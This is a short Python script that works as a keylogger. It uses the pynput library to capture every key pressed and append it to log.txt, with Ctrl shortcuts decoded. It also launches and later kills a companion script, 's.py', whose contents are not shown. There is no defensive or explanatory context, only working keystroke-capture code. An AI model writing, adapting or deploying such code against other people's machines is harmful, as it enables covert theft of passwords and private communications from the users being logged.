from pynput.keyboard import Key, Listener
import subprocess
import os


def on_press(key):
    print("{0} pressed".format(key))
    write_key_to_file(key)


def write_key_to_file(key):
    with open("log.txt", "a") as f:
        k = str(key).replace("'", "")
        if k == "Key.space":
            f.write(" ")
        elif k.__contains__("backspace"):
            f.write(" backspace ")
        elif k.__contains__("x03"):
            f.write(" ctrl+c ")
        elif k.__contains__("x16"):
            f.write(" ctrl+v ")
        elif k.__contains__("x01"):
            f.write(" ctrl+a ")
        elif k.__contains__("x13"):
            f.write(" ctrl+s ")
        elif k.__contains__("."):
            f.write(f" {k[4:]} ")
        else:
            f.write(k)


def on_release(key):
    if key == Key.esc:
        global ssProcess
        ssProcess.kill()
        return False

path = os.getcwd() 
path += "\\lib"
os.chdir(path)
ssProcess = subprocess.Popen(['python', 's.py'])
#ssProcess = subprocess.Popen(['python', 's.py'], shell = True ) # use shell to have an independent process

with Listener(on_press=on_press, on_release=on_release, ) as listener:
    listener.join()